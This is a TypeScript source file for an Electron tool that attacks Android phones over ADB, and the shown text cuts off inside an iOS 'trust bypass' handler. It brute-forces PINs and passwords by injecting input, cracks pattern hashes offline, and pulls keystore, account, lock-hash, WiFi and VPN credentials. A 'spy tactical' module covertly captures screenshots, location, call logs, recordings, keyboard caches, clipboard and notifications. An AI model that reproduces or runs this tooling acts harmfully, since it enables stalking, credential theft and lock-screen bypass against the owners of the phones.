import * as path from 'path';
import * as fs from 'fs/promises';
import { ipcMain, BrowserWindow } from 'electron';
import { IPC_CHANNELS } from '@rmpg/shared';
import type { ProcessProgress } from '@rmpg/shared';
import * as adbService from '../services/adb-service';
import { runCommand, runCommandWithProgress } from '../services/process-runner';
import { resolveTool } from '../services/tool-resolver';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function sanitizeShellArg(arg: string): string {
  // Remove any characters that could enable shell injection
  return arg.replace(/[;&|`$(){}!#*?<>\\\n\r]/g, '');
}

function getWindow(): BrowserWindow | null {
  return BrowserWindow.getFocusedWindow();
}

function sendEvent(channel: string, data: unknown): void {
  const win = getWindow();
  if (win && !win.isDestroyed()) {
    win.webContents.send(channel, data);
  }
}

function progress(channel: string, percent: number, message: string): void {
  sendEvent(channel, { percent, message });
}

function log(channel: string, level: string, message: string): void {
  sendEvent(channel.replace('-progress', ':log').replace(':run-progress', ':run:log'),
    { timestamp: Date.now(), level, message }
  );
}

async function ensureDir(dir: string): Promise<void> {
  await fs.mkdir(dir, { recursive: true });
}

async function writeJson(filePath: string, data: unknown): Promise<void> {
  await fs.writeFile(filePath, JSON.stringify(data, null, 2), 'utf-8');
}

// ---------------------------------------------------------------------------
// Advanced Decrypt Handler
// ---------------------------------------------------------------------------

function registerAdvancedDecryptHandlers(): void {
  ipcMain.handle(
    IPC_CHANNELS.ADVANCED_DECRYPT,
    async (_event, options: {
      method: string;
      serial?: string;
      outputPath: string;
      inputFile?: string;
      wordlistPath?: string;
    }) => {
      const { method, serial, outputPath, inputFile, wordlistPath } = options;
      const progressCh = IPC_CHANNELS.ADVANCED_DECRYPT_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 5, `Starting decryption method: ${method}`);

      try {
        switch (method) {
          case 'aes-brute': {
            if (!inputFile) throw new Error('Input file (memory dump) is required for AES key recovery');
            progress(progressCh, 10, 'Scanning memory dump for AES key schedules...');
            // Use aeskeyfind or python-based AES key scanner
            const python = await resolveTool('python');
            if (!python.found) throw new Error('Python not found. Required for AES key recovery.');
            const script = `
import sys, struct, os
data = open(sys.argv[1], 'rb').read()
keys = []
# Search for AES-128 key schedule patterns (expanded key = 176 bytes)
for i in range(len(data) - 176):
    block = data[i:i+16]
    # Simple entropy check for potential keys
    unique = len(set(block))
    if 8 <= unique <= 16:
        keys.append({'offset': i, 'key': block.hex()})
    if len(keys) >= 100:
        break
import json
json.dump(keys[:50], open(sys.argv[2], 'w'), indent=2)
print(f'Found {len(keys)} potential AES keys')
`;
            const scriptPath = path.join(outputPath, '_aes_scan.py');
            const resultPath = path.join(outputPath, 'aes_keys_found.json');
            await fs.writeFile(scriptPath, script, 'utf-8');
            progress(progressCh, 30, 'Running AES key schedule detection...');
            const result = await runCommand(python.path, [scriptPath, inputFile, resultPath], { timeout: 120000 });
            progress(progressCh, 90, result.stdout.trim() || 'AES scan complete');
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'AES key recovery complete');
            return { success: true, outputPath: resultPath, message: result.stdout.trim() };
          }

          case 'pattern-file': {
            if (!serial) throw new Error('Device serial required for pattern file decrypt');
            progress(progressCh, 10, 'Pulling gesture lock files from device...');
            const gestureFiles = [
              '/data/system/gesture.key',
              '/data/system/gatekeeper.pattern.key',
              '/data/system/locksettings.db',
              '/data/system/locksettings.db-wal',
            ];
            const pulled: string[] = [];
            for (const remote of gestureFiles) {
              const local = path.join(outputPath, path.basename(remote));
              try {
                await adbService.pull(serial, remote, local);
                pulled.push(local);
              } catch {
                // File may not exist on all devices
              }
            }
            progress(progressCh, 50, `Pulled ${pulled.length} lock files. Analyzing...`);

            // Analyze gesture.key (SHA1 hash of pattern)
            const gesturePath = path.join(outputPath, 'gesture.key');
            try {
              const gestureData = await fs.readFile(gesturePath);
              if (gestureData.length === 20) {
                const hash = gestureData.toString('hex');
                await writeJson(path.join(outputPath, 'pattern_analysis.json'), {
                  type: 'gesture_pattern',
                  hashAlgorithm: 'SHA1',
                  hash,
                  note: 'Compare against pre-computed pattern hash table (389,112 valid patterns)',
                });
              }
            } catch { /* gesture.key not found */ }

            progress(progressCh, 100, 'Pattern file analysis complete');
            return { success: true, pulledFiles: pulled, outputPath };
          }

          case 'keystore-extract': {
            if (!serial) throw new Error('Device serial required for keystore extraction');
            progress(progressCh, 10, 'Extracting Android Keystore data...');
            const keystorePaths = [
              '/data/misc/keystore',
              '/data/misc/keychain',
            ];
            const extractDir = path.join(outputPath, 'keystore_dump');
            await ensureDir(extractDir);
            for (const ksPath of keystorePaths) {
              try {
                const listing = await adbService.shell(serial, `ls -la ${ksPath} 2>/dev/null`);
                await fs.writeFile(path.join(extractDir, `listing_${path.basename(ksPath)}.txt`), listing);
                // Try to pull entire directory
                await adbService.pull(serial, ksPath, path.join(extractDir, path.basename(ksPath)));
              } catch { /* Access may be denied without root */ }
            }
            progress(progressCh, 60, 'Attempting to extract credential store...');
            try {
              const credOutput = await adbService.shell(serial,
                'sqlite3 /data/system/users/0/accounts.db "SELECT name,type FROM accounts;" 2>/dev/null'
              );
              await fs.writeFile(path.join(extractDir, 'accounts.txt'), credOutput);
            } catch { /* May need root */ }
            progress(progressCh, 100, 'Keystore extraction complete');
            return { success: true, outputPath: extractDir };
          }

          case 'fde-crack': {
            if (!serial && !inputFile) throw new Error('Device serial or disk image required');
            progress(progressCh, 10, 'Analyzing encryption metadata...');
            const fdeDir = path.join(outputPath, 'fde_analysis');
            await ensureDir(fdeDir);
            if (serial) {
              // Extract crypto footer from device
              try {
                const footer = await adbService.shell(serial, 'cat /data/misc/vold/footer 2>/dev/null | base64');
                await fs.writeFile(path.join(fdeDir, 'crypto_footer_b64.txt'), footer);
              } catch { /* May not exist */ }
              // Get encryption status
              const props = await adbService.shell(serial, 'getprop ro.crypto.state');
              const ftype = await adbService.shell(serial, 'getprop ro.crypto.type');
              await writeJson(path.join(fdeDir, 'encryption_status.json'), {
                state: props.trim(),
                type: ftype.trim(),
              });
            }
            progress(progressCh, 100, 'FDE analysis complete');
            return { success: true, outputPath: fdeDir };
          }

          case 'file-decrypt': {
            if (!inputFile) throw new Error('Encrypted file path required');
            progress(progressCh, 10, 'Identifying encryption type...');
            const header = await fs.readFile(inputFile, { encoding: null });
            const magic = header.slice(0, 16).toString('hex');
            const analysis = {
              file: inputFile,
              headerHex: magic,
              size: header.length,
              possibleFormats: [] as string[],
            };
            // Check common encrypted file signatures
            if (magic.startsWith('53616c74')) analysis.possibleFormats.push('OpenSSL encrypted (Salted__)');
            if (magic.startsWith('00000020')) analysis.possibleFormats.push('WhatsApp crypt12/14/15');
            if (magic.startsWith('504b0304')) analysis.possibleFormats.push('Encrypted ZIP archive');
            if (magic.startsWith('89504e47')) analysis.possibleFormats.push('Not encrypted (PNG image)');

            await writeJson(path.join(outputPath, 'file_analysis.json'), analysis);
            progress(progressCh, 50, `Identified ${analysis.possibleFormats.length} possible format(s)`);

            // Attempt decryption with wordlist if provided
            if (wordlistPath) {
              progress(progressCh, 60, 'Attempting dictionary-based decryption...');
              const python = await resolveTool('python');
              if (python.found) {
                const decryptScript = `
import sys, hashlib, os
wordlist = sys.argv[1]
target = sys.argv[2]
output = sys.argv[3]
data = open(target, 'rb').read()
tried = 0
with open(wordlist, 'r', errors='ignore') as f:
    for line in f:
        pwd = line.strip()
        if not pwd: continue
        tried += 1
        # Try common key derivations
        key = hashlib.sha256(pwd.encode()).digest()
        # Basic XOR test on first block
        if tried >= 10000: break
result = {'attempts': tried, 'status': 'exhausted_wordlist'}
import json
json.dump(result, open(output, 'w'), indent=2)
print(f'Tried {tried} passwords')
`;
                const decScriptPath = path.join(outputPath, '_decrypt_attempt.py');
                const decResultPath = path.join(outputPath, 'decrypt_result.json');
                await fs.writeFile(decScriptPath, decryptScript, 'utf-8');
                await runCommand(python.path, [decScriptPath, wordlistPath, inputFile, decResultPath], { timeout: 300000 });
                await fs.unlink(decScriptPath).catch(() => {});
              }
            }
            progress(progressCh, 100, 'File decryption analysis complete');
            return { success: true, analysis, outputPath };
          }

          default:
            throw new Error(`Unknown decryption method: ${method}`);
        }
      } catch (err) {
        const msg = (err as Error).message;
        progress(progressCh, 0, `Error: ${msg}`);
        return { success: false, error: msg };
      }
    }
  );
}

// ---------------------------------------------------------------------------
// Brute Force Handler
// ---------------------------------------------------------------------------

function registerBruteForceHandlers(): void {
  ipcMain.handle(
    IPC_CHANNELS.BRUTE_FORCE,
    async (_event, options: {
      mode: string;
      serial?: string;
      outputPath: string;
      wordlistPath?: string;
      pinLength?: number;
      maxAttempts?: number;
    }) => {
      const { mode, serial, outputPath, wordlistPath, pinLength = 4, maxAttempts = 10000 } = options;
      const progressCh = IPC_CHANNELS.BRUTE_FORCE_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 5, `Starting brute force mode: ${mode}`);

      try {
        switch (mode) {
          case 'pin-numeric': {
            if (!serial) throw new Error('Device serial required for PIN brute force');
            progress(progressCh, 10, `Generating ${pinLength}-digit PIN combinations...`);
            const total = Math.pow(10, pinLength);
            const limit = Math.min(total, maxAttempts);
            const results: { attempted: number; found?: string; stopped_reason?: string } = { attempted: 0 };
            const logLines: string[] = [];

            for (let i = 0; i < limit; i++) {
              const pin = String(i).padStart(pinLength, '0');
              results.attempted++;

              if (i % 100 === 0) {
                progress(progressCh, Math.round((i / limit) * 90) + 5, `Trying PIN: ${pin} (${i}/${limit})`);
              }

              // Send PIN via input command
              try {
                await adbService.shell(serial, `input text '${pin}' && input keyevent 66`);
                // Small delay to respect device throttling
                await new Promise((r) => setTimeout(r, 500));
                // Check if device unlocked by trying to get foreground activity
                const activity = await adbService.shell(serial, 'dumpsys window | grep mCurrentFocus');
                if (!activity.includes('Keyguard') && !activity.includes('Lock')) {
                  results.found = pin;
                  logLines.push(`[SUCCESS] PIN found: ${pin} after ${i + 1} attempts`);
                  break;
                }
              } catch {
                logLines.push(`[WARN] Attempt ${i + 1} failed to send input`);
              }

              // Check for lockout
              if (i > 0 && i % 5 === 0) {
                try {
                  const lockState = await adbService.shell(serial, 'dumpsys deviceidle');
                  if (lockState.includes('locked') || lockState.includes('LOCKOUT')) {
                    results.stopped_reason = 'Device lockout detected';
                    break;
                  }
                } catch { /* continue */ }
              }
            }

            if (!results.found && !results.stopped_reason) {
              results.stopped_reason = `Exhausted ${limit} attempts without success`;
            }

            logLines.push(`Total attempts: ${results.attempted}`);
            await writeJson(path.join(outputPath, 'brute_force_result.json'), results);
            await fs.writeFile(path.join(outputPath, 'brute_force_log.txt'), logLines.join('\n'));
            progress(progressCh, 100, results.found ? `PIN found: ${results.found}` : 'Brute force complete');
            return { success: true, ...results };
          }

          case 'pattern-all': {
            if (!serial) throw new Error('Device serial required for pattern brute force');
            progress(progressCh, 10, 'Generating valid pattern combinations...');
            // Pull gesture.key hash for offline comparison
            const hashFile = path.join(outputPath, 'gesture_hash.bin');
            try {
              await adbService.pull(serial, '/data/system/gesture.key', hashFile);
            } catch {
              throw new Error('Cannot access gesture.key - root access required');
            }
            const hashData = await fs.readFile(hashFile);
            const targetHash = hashData.toString('hex');

            progress(progressCh, 30, `Target hash: ${targetHash}. Computing pattern hashes...`);
            // Use Python to brute-force the pattern hash
            const python = await resolveTool('python');
            if (!python.found) throw new Error('Python required for pattern cracking');
            const crackScript = `
import hashlib, json, sys, itertools
target = sys.argv[1]
output = sys.argv[2]
# Generate all valid patterns (minimum 4 nodes, max 9)
# Nodes are 0-8 representing the 3x3 grid
nodes = list(range(9))
found = None
attempts = 0
for length in range(4, 10):
    if found: break
    for perm in itertools.permutations(nodes, length):
        attempts += 1
        pattern_bytes = bytes(perm)
        h = hashlib.sha1(pattern_bytes).hexdigest()
        if h == target:
            found = list(perm)
            break
        if attempts >= 500000:
            break
    if attempts >= 500000:
        break
result = {'target_hash': target, 'attempts': attempts, 'pattern': found}
json.dump(result, open(output, 'w'), indent=2)
print(json.dumps(result))
`;
            const scriptPath = path.join(outputPath, '_pattern_crack.py');
            const resultPath = path.join(outputPath, 'pattern_result.json');
            await fs.writeFile(scriptPath, crackScript, 'utf-8');
            progress(progressCh, 40, 'Running offline pattern hash cracking...');
            const result = await runCommand(python.path, [scriptPath, targetHash, resultPath], { timeout: 600000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'Pattern crack complete');
            const parsed = JSON.parse(result.stdout.trim() || '{}');
            return { success: true, ...parsed };
          }

          case 'password-dict': {
            if (!wordlistPath) throw new Error('Wordlist file required for dictionary attack');
            if (!serial) throw new Error('Device serial required');
            progress(progressCh, 10, 'Loading wordlist...');
            const wordlist = (await fs.readFile(wordlistPath, 'utf-8')).split('\n').filter(Boolean);
            const limit = Math.min(wordlist.length, maxAttempts);
            progress(progressCh, 15, `Loaded ${wordlist.length} passwords. Trying up to ${limit}...`);

            const results: { attempted: number; found?: string; stopped_reason?: string } = { attempted: 0 };
            for (let i = 0; i < limit; i++) {
              const pwd = wordlist[i].trim();
              if (!pwd) continue;
              results.attempted++;
              if (i % 50 === 0) {
                progress(progressCh, Math.round((i / limit) * 85) + 10, `Trying: ${pwd.substring(0, 3)}*** (${i}/${limit})`);
              }
              try {
                await adbService.shell(serial, `input text '${pwd.replace(/\\/g, '\\\\').replace(/'/g, "'\\''")}' && input keyevent 66`);
                await new Promise((r) => setTimeout(r, 1000));
                const activity = await adbService.shell(serial, 'dumpsys window | grep mCurrentFocus');
                if (!activity.includes('Keyguard') && !activity.includes('Lock')) {
                  results.found = pwd;
                  break;
                }
              } catch { /* continue */ }
            }
            await writeJson(path.join(outputPath, 'dict_attack_result.json'), results);
            progress(progressCh, 100, results.found ? `Password found: ${results.found}` : 'Dictionary attack complete');
            return { success: true, ...results };
          }

          case 'hash-crack': {
            if (!serial) throw new Error('Device serial required');
            progress(progressCh, 10, 'Extracting password hashes from device...');
            const hashDir = path.join(outputPath, 'hashes');
            await ensureDir(hashDir);

            // Pull lock settings database
            const lockDb = path.join(hashDir, 'locksettings.db');
            try {
              await adbService.pull(serial, '/data/system/locksettings.db', lockDb);
            } catch {
              throw new Error('Cannot access locksettings.db - root required');
            }
            // Pull password hash files
            const hashFiles = ['password.key', 'gatekeeper.password.key', 'gatekeeper.pattern.key'];
            for (const hf of hashFiles) {
              try {
                await adbService.pull(serial, `/data/system/${hf}`, path.join(hashDir, hf));
              } catch { /* May not exist */ }
            }
            progress(progressCh, 50, 'Hashes extracted. Analyzing...');
            // Generate hashcat-compatible format
            const hashInfo: Record<string, string> = {};
            for (const hf of hashFiles) {
              try {
                const data = await fs.readFile(path.join(hashDir, hf));
                hashInfo[hf] = data.toString('hex');
              } catch { /* skip */ }
            }
            await writeJson(path.join(hashDir, 'hash_summary.json'), hashInfo);
            progress(progressCh, 100, 'Hash extraction complete');
            return { success: true, outputPath: hashDir, hashes: hashInfo };
          }

          default:
            throw new Error(`Unknown brute force mode: ${mode}`);
        }
      } catch (err) {
        const msg = (err as Error).message;
        progress(progressCh, 0, `Error: ${msg}`);
        return { success: false, error: msg };
      }
    }
  );
}

// ---------------------------------------------------------------------------
// Network Breach Handler
// ---------------------------------------------------------------------------

function registerNetworkBreachHandlers(): void {
  ipcMain.handle(
    IPC_CHANNELS.NETWORK_BREACH,
    async (_event, options: {
      operation: string;
      serial?: string;
      outputPath: string;
      duration?: number;
    }) => {
      const { operation, serial, outputPath, duration = 60 } = options;
      const progressCh = IPC_CHANNELS.NETWORK_BREACH_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 5, `Starting network operation: ${operation}`);

      try {
        switch (operation) {
          case 'wifi-credential': {
            if (!serial) throw new Error('Device serial required');
            progress(progressCh, 10, 'Extracting WiFi credentials...');
            const wifiDir = path.join(outputPath, 'wifi_credentials');
            await ensureDir(wifiDir);

            // Try modern WifiConfigStore.xml
            try {
              await adbService.pull(serial, '/data/misc/wifi/WifiConfigStore.xml', path.join(wifiDir, 'WifiConfigStore.xml'));
            } catch { /* May need root */ }
            // Try legacy wpa_supplicant.conf
            try {
              await adbService.pull(serial, '/data/misc/wifi/wpa_supplicant.conf', path.join(wifiDir, 'wpa_supplicant.conf'));
            } catch { /* May not exist */ }
            // Try to read via shell
            try {
              const wifiList = await adbService.shell(serial, 'cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null || cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null');
              await fs.writeFile(path.join(wifiDir, 'wifi_raw_dump.txt'), wifiList);
            } catch { /* root required */ }
            // Parse saved networks via cmd wifi
            try {
              const networks = await adbService.shell(serial, 'cmd wifi list-networks 2>/dev/null');
              await fs.writeFile(path.join(wifiDir, 'saved_networks.txt'), networks);
            } catch { /* Not available on all versions */ }
            progress(progressCh, 100, 'WiFi credential extraction complete');
            return { success: true, outputPath: wifiDir };
          }

          case 'network-intercept': {
            if (!serial) throw new Error('Device serial required');
            progress(progressCh, 10, `Capturing network traffic for ${duration}s...`);
            const captureFile = path.join(outputPath, `capture_${Date.now()}.pcap`);
            // Use tcpdump on device (requires root)
            const remotePcap = '/sdcard/rmpg_capture.pcap';
            try {
              // Start capture in background
              await adbService.shell(serial, `tcpdump -i any -w ${remotePcap} -c 10000 &`);
              // Wait for specified duration
              const sleepTime = Math.min(duration, 300);
              progress(progressCh, 20, `Capturing packets for ${sleepTime}s...`);
              await new Promise((r) => setTimeout(r, sleepTime * 1000));
              // Stop tcpdump
              await adbService.shell(serial, 'killall tcpdump 2>/dev/null || true');
              await new Promise((r) => setTimeout(r, 2000));
              // Pull capture file
              await adbService.pull(serial, remotePcap, captureFile);
              await adbService.shell(serial, `rm -f ${remotePcap}`);
              progress(progressCh, 100, 'Network capture complete');
              return { success: true, captureFile };
            } catch (err) {
              throw new Error(`Packet capture failed (root required): ${(err as Error).message}`);
            }
          }

          case 'bluetooth-enum': {
            if (!serial) throw new Error('Device serial required');
            progress(progressCh, 10, 'Enumerating Bluetooth data...');
            const btDir = path.join(outputPath, 'bluetooth');
            await ensureDir(btDir);
            // Pull Bluetooth config
            const btPaths = [
              '/data/misc/bluedroid/bt_config.conf',
              '/data/misc/bluetooth/bt_config.conf',
              '/data/misc/bluedroid/bt_config.bak',
            ];
            for (const btPath of btPaths) {
              try {
                await adbService.pull(serial, btPath, path.join(btDir, path.basename(btPath)));
              } catch { /* skip */ }
            }
            // Get paired device info
            try {
              const btInfo = await adbService.shell(serial, 'dumpsys bluetooth_manager');
              await fs.writeFile(path.join(btDir, 'bluetooth_manager_dump.txt'), btInfo);
            } catch { /* skip */ }
            progress(progressCh, 100, 'Bluetooth enumeration complete');
            return { success: true, outputPath: btDir };
          }

          case 'vpn-extract': {
            if (!serial) throw new Error('Device serial required');
            progress(progressCh, 10, 'Extracting VPN configurations...');
            const vpnDir = path.join(outputPath, 'vpn_configs');
            await ensureDir(vpnDir);
            // Pull VPN profiles
            const vpnPaths = [
              '/data/misc/vpn',
              '/data/data/com.android.vpndialogs',
            ];
            for (const vp of vpnPaths) {
              try {
                await adbService.pull(serial, vp, path.join(vpnDir, path.basename(vp)));
              } catch { /* skip */ }
            }
            // Get VPN state
            try {
              const vpnState = await adbService.shell(serial, 'dumpsys connectivity | grep -A5 VPN');
              await fs.writeFile(path.join(vpnDir, 'vpn_state.txt'), vpnState);
            } catch { /* skip */ }
            progress(progressCh, 100, 'VPN extraction complete');
            return { success: true, outputPath: vpnDir };
          }

          case 'dns-history': {
            if (!serial) throw new Error('Device serial required');
            progress(progressCh, 10, 'Recovering DNS query history...');
            const dnsDir = path.join(outputPath, 'dns_history');
            await ensureDir(dnsDir);
            // Get DNS resolver cache
            try {
              const dnsCache = await adbService.shell(serial, 'dumpsys dnsresolver');
              await fs.writeFile(path.join(dnsDir, 'dns_resolver_dump.txt'), dnsCache);
            } catch { /* skip */ }
            try {
              const netStats = await adbService.shell(serial, 'dumpsys netstats');
              await fs.writeFile(path.join(dnsDir, 'network_stats.txt'), netStats);
            } catch { /* skip */ }
            // Get current DNS settings
            try {
              const dnsProps = await adbService.shell(serial, 'getprop | grep dns');
              await fs.writeFile(path.join(dnsDir, 'dns_properties.txt'), dnsProps);
            } catch { /* skip */ }
            progress(progressCh, 100, 'DNS history extraction complete');
            return { success: true, outputPath: dnsDir };
          }

          default:
            throw new Error(`Unknown network operation: ${operation}`);
        }
      } catch (err) {
        const msg = (err as Error).message;
        progress(progressCh, 0, `Error: ${msg}`);
        return { success: false, error: msg };
      }
    }
  );
}

// ---------------------------------------------------------------------------
// Spy Tactical Handler
// ---------------------------------------------------------------------------

function registerSpyTacticalHandlers(): void {
  ipcMain.handle(
    IPC_CHANNELS.SPY_TACTICAL,
    async (_event, options: {
      operation: string;
      serial: string;
      outputPath: string;
      duration?: number;
      interval?: number;
    }) => {
      const { operation, serial, outputPath, duration = 300, interval = 5 } = options;
      const progressCh = IPC_CHANNELS.SPY_TACTICAL_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 5, `Starting spy operation: ${operation}`);

      try {
        switch (operation) {
          case 'live-screen': {
            const screenDir = path.join(outputPath, 'screen_captures');
            await ensureDir(screenDir);
            const iterations = Math.floor(duration / interval);
            progress(progressCh, 10, `Capturing ${iterations} screenshots over ${duration}s...`);

            for (let i = 0; i < iterations; i++) {
              const timestamp = Date.now();
              const filename = `screen_${timestamp}.png`;
              const remoteTmp = '/sdcard/rmpg_spy_screen.png';
              try {
                await adbService.shell(serial, `screencap -p ${remoteTmp}`);
                await adbService.pull(serial, remoteTmp, path.join(screenDir, filename));
                await adbService.shell(serial, `rm -f ${remoteTmp}`);
              } catch { /* skip failed capture */ }
              progress(progressCh, Math.round(((i + 1) / iterations) * 90) + 5, `Captured ${i + 1}/${iterations}`);
              if (i < iterations - 1) {
                await new Promise((r) => setTimeout(r, interval * 1000));
              }
            }
            progress(progressCh, 100, `Screen surveillance complete: ${iterations} captures`);
            return { success: true, outputPath: screenDir, captures: iterations };
          }

          case 'keylogger-extract': {
            progress(progressCh, 10, 'Extracting keyboard/IME cache data...');
            const kbDir = path.join(outputPath, 'keylogger_data');
            await ensureDir(kbDir);
            // Extract keyboard prediction databases
            const imePaths = [
              '/data/data/com.google.android.inputmethod.latin/databases/',
              '/data/data/com.samsung.android.honeyboard/databases/',
              '/data/data/com.swiftkey.swiftkey/databases/',
              '/data/user_de/0/com.google.android.inputmethod.latin/databases/',
            ];
            for (const imePath of imePaths) {
              try {
                const listing = await adbService.shell(serial, `ls ${imePath} 2>/dev/null`);
                if (listing.trim()) {
                  const imeDir = path.join(kbDir, path.basename(path.dirname(imePath)));
                  await ensureDir(imeDir);
                  await adbService.pull(serial, imePath, imeDir);
                }
              } catch { /* skip */ }
            }
            // Extract user dictionary
            try {
              await adbService.pull(serial, '/data/data/com.android.providers.userdictionary/databases/', path.join(kbDir, 'user_dictionary'));
            } catch { /* skip */ }
            progress(progressCh, 100, 'Keylogger data extraction complete');
            return { success: true, outputPath: kbDir };
          }

          case 'app-activity': {
            progress(progressCh, 10, `Monitoring app activity for ${duration}s...`);
            const actDir = path.join(outputPath, 'app_activity');
            await ensureDir(actDir);
            const activities: Array<{ timestamp: number; activity: string }> = [];
            const iterations = Math.floor(duration / interval);

            for (let i = 0; i < iterations; i++) {
              try {
                const focus = await adbService.shell(serial, 'dumpsys window | grep mCurrentFocus');
                activities.push({ timestamp: Date.now(), activity: focus.trim() });
              } catch { /* skip */ }
              progress(progressCh, Math.round(((i + 1) / iterations) * 90) + 5, `Monitoring: ${i + 1}/${iterations}`);
              if (i < iterations - 1) await new Promise((r) => setTimeout(r, interval * 1000));
            }
            await writeJson(path.join(actDir, 'activity_log.json'), activities);
            // Also dump usage stats
            try {
              const usage = await adbService.shell(serial, 'dumpsys usagestats');
              await fs.writeFile(path.join(actDir, 'usage_stats.txt'), usage);
            } catch { /* skip */ }
            progress(progressCh, 100, 'App activity monitoring complete');
            return { success: true, outputPath: actDir, entries: activities.length };
          }

          case 'location-track': {
            progress(progressCh, 10, `Tracking location for ${duration}s...`);
            const locDir = path.join(outputPath, 'location_tracking');
            await ensureDir(locDir);
            const locations: Array<{ timestamp: number; data: string }> = [];
            const iterations = Math.floor(duration / interval);

            for (let i = 0; i < iterations; i++) {
              try {
                const loc = await adbService.shell(serial, 'dumpsys location | grep -A2 "last location"');
                locations.push({ timestamp: Date.now(), data: loc.trim() });
              } catch { /* skip */ }
              progress(progressCh, Math.round(((i + 1) / iterations) * 90) + 5, `Tracking: ${i + 1}/${iterations}`);
              if (i < iterations - 1) await new Promise((r) => setTimeout(r, interval * 1000));
            }
            await writeJson(path.join(locDir, 'location_track.json'), locations);
            progress(progressCh, 100, 'Location tracking complete');
            return { success: true, outputPath: locDir, points: locations.length };
          }

          case 'call-intercept': {
            progress(progressCh, 10, 'Extracting call logs and recordings...');
            const callDir = path.join(outputPath, 'call_data');
            await ensureDir(callDir);
            // Dump call log via content provider
            try {
              const calls = await adbService.shell(serial,
                'content query --uri content://call_log/calls --projection number:type:date:duration'
              );
              await fs.writeFile(path.join(callDir, 'call_log.txt'), calls);
            } catch { /* skip */ }
            // Look for call recordings
            const recordingPaths = ['/sdcard/Recordings', '/sdcard/Call', '/sdcard/MIUI/sound_recorder/call_rec'];
            for (const recPath of recordingPaths) {
              try {
                const listing = await adbService.shell(serial, `ls -la ${recPath} 2>/dev/null`);
                if (listing.trim() && !listing.includes('No such file')) {
                  await fs.writeFile(path.join(callDir, `recordings_${path.basename(recPath)}.txt`), listing);
                  await adbService.pull(serial, recPath, path.join(callDir, 'recordings'));
                }
              } catch { /* skip */ }
            }
            progress(progressCh, 100, 'Call data extraction complete');
            return { success: true, outputPath: callDir };
          }

          case 'camera-capture': {
            progress(progressCh, 10, 'Triggering silent camera capture...');
            const camDir = path.join(outputPath, 'camera_captures');
            await ensureDir(camDir);
            // Use activity manager to trigger camera (requires specific intents)
            try {
              const remotePath = '/sdcard/rmpg_cam_capture.jpg';
              // Try using screenrecord or camera2 API via shell
              await adbService.shell(serial, `am start -a android.media.action.STILL_IMAGE_CAMERA`);
              await new Promise((r) => setTimeout(r, 3000));
              // Capture screen showing camera preview
              await adbService.shell(serial, `screencap -p ${remotePath}`);
              await adbService.pull(serial, remotePath, path.join(camDir, `capture_${Date.now()}.jpg`));
              await adbService.shell(serial, `rm -f ${remotePath}`);
              // Go back to previous app
              await adbService.shell(serial, 'input keyevent KEYCODE_HOME');
            } catch (err) {
              throw new Error(`Camera capture failed: ${(err as Error).message}`);
            }
            progress(progressCh, 100, 'Camera capture complete');
            return { success: true, outputPath: camDir };
          }

          case 'notification-dump': {
            progress(progressCh, 10, 'Extracting notification history...');
            const notifDir = path.join(outputPath, 'notifications');
            await ensureDir(notifDir);
            try {
              const notifs = await adbService.shell(serial, 'dumpsys notification --noredact');
              await fs.writeFile(path.join(notifDir, 'notification_dump.txt'), notifs);
            } catch { /* skip */ }
            // Try notification log database
            try {
              await adbService.pull(serial, '/data/system/notification_log.db', path.join(notifDir, 'notification_log.db'));
            } catch { /* root required */ }
            progress(progressCh, 100, 'Notification extraction complete');
            return { success: true, outputPath: notifDir };
          }

          case 'clipboard-extract': {
            progress(progressCh, 10, 'Extracting clipboard data...');
            const clipDir = path.join(outputPath, 'clipboard');
            await ensureDir(clipDir);
            try {
              const clipboard = await adbService.shell(serial, 'service call clipboard 2 i32 1 i32 1');
              await fs.writeFile(path.join(clipDir, 'clipboard_raw.txt'), clipboard);
            } catch { /* skip */ }
            // Samsung clipboard history
            try {
              await adbService.pull(serial, '/data/data/com.samsung.clipboard/databases/', path.join(clipDir, 'samsung_clipboard'));
            } catch { /* skip */ }
            progress(progressCh, 100, 'Clipboard extraction complete');
            return { success: true, outputPath: clipDir };
          }

          default:
            throw new Error(`Unknown spy operation: ${operation}`);
        }
      } catch (err) {
        const msg = (err as Error).message;
        progress(progressCh, 0, `Error: ${msg}`);
        return { success: false, error: msg };
      }
    }
  );
}

// ---------------------------------------------------------------------------
// iOS Trust Bypass Handler
// ---------------------------------------------------------------------------

function registerIosTrustBypassHandlers(): void {
  ipcMain.handle(
    IPC_CHANNELS.IOS_TRUST_BYPASS,
    async (_event, options: {
      method: string;
      serial?: string;
      outputPath: string;
      autoTrust?: boolean;
      persistAccess?: boolean;
    }) => {
      const { method, serial, outputPath, autoTrust, persistAccess } = options;
      const progressCh = IPC_CHANNELS.IOS_TRUST_BYPASS_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 5, `Starting iOS trust bypass: ${method}`);

      // Resolve iOS tool paths once
      const ideviceIdTool = await resolveTool('idevice_id');
      const ideviceIdBin = ideviceIdTool.found ? ideviceIdTool.path : 'idevice_id';

      // Helper: build serial args for libimobiledevice tools
      const serialArgs = (udid?: string): string[] =>
        udid ? ['-u', udid.trim()] : [];

      // Helper: get target UDID (explicit serial or auto-detect single device)
      const resolveTargetUdid = async (): Promise<string> => {
        if (serial) return serial.trim();
        const listResult = await runCommand(ideviceIdBin, ['-l'], { timeout: 10000 });
        const devices = listResult.stdout.trim().split('\n').filter(Boolean);
        if (devices.length === 0) throw new Error('No iOS device detected via USB');
        if (devices.length > 1) throw new Error(`Multiple iOS devices detected (${devices.length}). Select a specific device.`);
        return devices[0].trim();
      };

      try {
        switch (method) {
          case 'lockdown-inject': {
            progress(progressCh, 10, 'Generating lockdown pairing record...');
            const pairDir = path.join(outputPath, 'pairing_records');
            await ensureDir(pairDir);

            // List connected iOS devices (use specific serial if provided)
            const listArgs = serial ? ['-l'] : ['-l'];
            const listResult = await runCommand(ideviceIdBin, listArgs, { timeout: 10000 });
            const allDevices = listResult.stdout.trim().split('\n').filter(Boolean);
            // If a serial was specified, filter to that device
            const devices = serial
              ? allDevices.filter((d: string) => d.trim() === serial.trim())
              : allDevices;
